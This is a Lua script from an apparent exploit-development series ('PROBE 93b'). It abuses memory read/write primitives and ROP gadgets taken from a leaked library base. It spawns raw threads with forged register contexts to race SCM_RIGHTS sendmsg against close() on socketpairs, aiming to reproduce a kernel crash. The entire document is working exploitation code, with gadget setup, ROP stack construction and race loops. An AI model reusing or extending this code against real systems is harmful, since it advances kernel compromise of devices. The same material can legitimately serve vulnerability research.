-- CRASH_CLASS: HIGH
-- PROBE 93b: SCM_RIGHTS close race — diagnostic followup
--
-- 93a Section C killed the process: SCM_RIGHTS sendmsg children on B
-- while main close(A) produced no output at all. Either crash or hang.
--
-- This probe isolates Section C with:
--   - Print at EVERY step (not just every 5th round)
--   - Incremental approach: 1 sender first, then scale up
--   - Flush detection: canary after each sub-step
--   - Also test: main sendmsg SCM_RIGHTS + child close (reversed roles)

print("=== PROBE 93b: SCM_RIGHTS CLOSE DIAG ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local MAX_CH=80
local STK_PG=1
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000))
local tb=R+0x80
local sv_buf=R+0x90

-- SCM_RIGHTS msghdr
local scm_byte=R+0x180; wd(scm_byte, 0x43)
local scm_iov=R+0x190
wq(scm_iov, uint64(scm_byte)); wq(scm_iov+8, uint64(1))
local scm_cmsg=R+0x1A0; z(scm_cmsg, 32)
wd(scm_cmsg, 20); wd(scm_cmsg+4, 0xFFFF); wd(scm_cmsg+8, 1)
local scm_msg=R+0x1C0; z(scm_msg, 0x30)
wq(scm_msg+0x10, uint64(scm_iov)); wd(scm_msg+0x18, 1)
wq(scm_msg+0x20, uint64(scm_cmsg)); wd(scm_msg+0x28, 24)

-- Block SIGPIPE
local sa_buf=memory.alloc(32); z(sa_buf,32); wq(sa_buf,uint64(1))
native.fcall_with_rax(stub,416,13,N(sa_buf),0)
print("SIGPIPE blocked")

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function spawn_sender(sock_fd, msg_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    local off=0
    local ncycles=math.floor((stk_bytes-200)/24)
    for i=1,ncycles do
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(28)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(28))
    wq(ctx+_DI,uint64(sock_fd))
    wq(ctx+_SI,uint64(msg_addr))
    wq(ctx+_DX,uint64(0x20080))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local function mkpair()
    wq(sv_buf,uint64(0))
    local rv=N(native.fcall_with_rax(stub,135,1,1,0,N(sv_buf)))
    if rv~=0 then return nil,nil end
    return rd(sv_buf), rd(sv_buf+4)
end

-- ============================================================
-- SECTION A: Baseline — SCM_RIGHTS without close (sanity)
-- ============================================================
print("")
print("--- A: SCM_RIGHTS BASELINE (no close) ---")

local A,B=mkpair()
if not A then print("PAIR FAIL") return end
local tgt=N(native.fcall_with_rax(stub,97,2,2,0))
print("pair A="..A.." B="..B.." tgt="..tgt)

wd(scm_cmsg+16, tgt)

-- Single child, let it send a few, then check
print("spawning 1 sender...")
spawn_sender(B, scm_msg)
print("spawn ok, sleeping 20ms...")
native.fcall_with_rax(stub,240,sl20,0)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("vm="..vmc())

native.fcall_with_rax(stub,6,A)
native.fcall_with_rax(stub,6,B)
native.fcall_with_rax(stub,6,tgt)
print("baseline cleanup OK")

-- ============================================================
-- SECTION B: SCM_RIGHTS + close(peer) — 1 sender, step by step
-- ============================================================
print("")
print("--- B: 1 SENDER + CLOSE(PEER) ---")

for round=1,5 do
    if cidx>=MAX_CH-1 then print("LIMIT") break end
    print(string.format("B%d: mkpair...",round))
    local bA,bB=mkpair()
    if not bA then print("B"..round..": PAIR FAIL") break end

    local bt=N(native.fcall_with_rax(stub,97,2,2,0))
    wd(scm_cmsg+16, bt)
    print(string.format("B%d: A=%d B=%d tgt=%d",round,bA,bB,bt))

    print(string.format("B%d: spawn 1 sender...",round))
    spawn_sender(bB, scm_msg)

    print(string.format("B%d: sleep 2ms...",round))
    native.fcall_with_rax(stub,240,sl2,0)

    print(string.format("B%d: close(A=%d)...",round,bA))
    native.fcall_with_rax(stub,6,bA)

    print(string.format("B%d: sleep 5ms...",round))
    native.fcall_with_rax(stub,240,sl5,0)

    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("B%d: canary=%d %s",round,c,c==pid and "OK" or "!! MISMATCH"))

    native.fcall_with_rax(stub,6,bB)
    native.fcall_with_rax(stub,6,bt)
    print(string.format("B%d: cleanup OK ch=%d",round,cidx))
end

-- ============================================================
-- SECTION C: SCM_RIGHTS + close(peer) — 4 senders (93a repro)
-- ============================================================
print("")
print("--- C: 4 SENDERS + CLOSE(PEER) ---")

for round=1,5 do
    if cidx>=MAX_CH-4 then print("LIMIT") break end
    print(string.format("C%d: setup...",round))
    local cA,cB=mkpair()
    if not cA then print("C"..round..": PAIR FAIL") break end

    local ct=N(native.fcall_with_rax(stub,97,2,2,0))
    wd(scm_cmsg+16, ct)
    print(string.format("C%d: A=%d B=%d tgt=%d",round,cA,cB,ct))

    print(string.format("C%d: spawn 4 senders...",round))
    for i=1,4 do spawn_sender(cB, scm_msg) end

    print(string.format("C%d: sleep 2ms...",round))
    native.fcall_with_rax(stub,240,sl2,0)

    print(string.format("C%d: close(A=%d)...",round,cA))
    native.fcall_with_rax(stub,6,cA)

    print(string.format("C%d: sleep 5ms...",round))
    native.fcall_with_rax(stub,240,sl5,0)

    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("C%d: canary=%d %s vm=%d",round,c,c==pid and "OK" or "!! MISMATCH",vmc()))

    native.fcall_with_rax(stub,6,cB)
    native.fcall_with_rax(stub,6,ct)
    print(string.format("C%d: cleanup OK ch=%d",round,cidx))
end

-- ============================================================
-- SECTION D: Main does SCM_RIGHTS, child does close (reversed)
-- ============================================================
print("")
print("--- D: MAIN SENDS SCM_RIGHTS, CHILD CLOSES ---")

for round=1,3 do
    if cidx>=MAX_CH-1 then print("LIMIT") break end
    print(string.format("D%d: setup...",round))
    local dA,dB=mkpair()
    if not dA then print("D"..round..": PAIR FAIL") break end
    local dt=N(native.fcall_with_rax(stub,97,2,2,0))
    wd(scm_cmsg+16, dt)
    print(string.format("D%d: A=%d B=%d tgt=%d",round,dA,dB,dt))

    -- Spawn child that does close(A) then nanosleep
    local di=cidx; cidx=cidx+1
    local dstk=child_stk(di); local dctx=child_ctx(di)
    -- Simple: just close(A) then nanosleep — no ROP loop needed
    local doff=0
    wq(dstk+doff,PRDI); doff=doff+8; wq(dstk+doff,uint64(ts)); doff=doff+8
    wq(dstk+doff,PRSI); doff=doff+8; wq(dstk+doff,uint64(0)); doff=doff+8
    wq(dstk+doff,PRAX); doff=doff+8; wq(dstk+doff,uint64(240)); doff=doff+8
    wq(dstk+doff,SA); doff=doff+8

    z(dctx, 0x200)
    wq(dctx+_MG,uint64(0x480)); wd(dctx+_FL,0)
    wq(dctx+_TP,uint64(0x10000))
    wq(dctx+_CS,uint64(0x43)); wq(dctx+_SS,uint64(0x3B))
    wq(dctx+_IP,SA); wq(dctx+_SP,uint64(dstk))
    wq(dctx+_AX,uint64(6))   -- close
    wq(dctx+_DI,uint64(dA))  -- close(A)

    wq(tb,uint64(0))
    pcall(function() tc(uint64(dctx),uint64(tb),uint64(0)) end)
    print(string.format("D%d: child spawned for close(A=%d)",round,dA))

    -- Main: pump SCM_RIGHTS sends on B
    local ok_count=0; local fail_count=0
    for i=1,200 do
        local sr=N(native.fcall_with_rax(stub,28,dB,N(scm_msg),0x20080))
        if sr>0 then ok_count=ok_count+1 else fail_count=fail_count+1 end
    end
    print(string.format("D%d: sends ok=%d fail=%d",round,ok_count,fail_count))

    local c=N(native.fcall_with_rax(stub,20))
    print(string.format("D%d: canary=%d %s",round,c,c==pid and "OK" or "!! MISMATCH"))

    native.fcall_with_rax(stub,6,dB)
    native.fcall_with_rax(stub,6,dt)
    print(string.format("D%d: cleanup OK",round))
end

-- ============================================================
print("")
print(string.format("DONE ch=%d canary=%d",cidx,N(native.fcall_with_rax(stub,20))))
print("=== 93b COMPLETE ===")
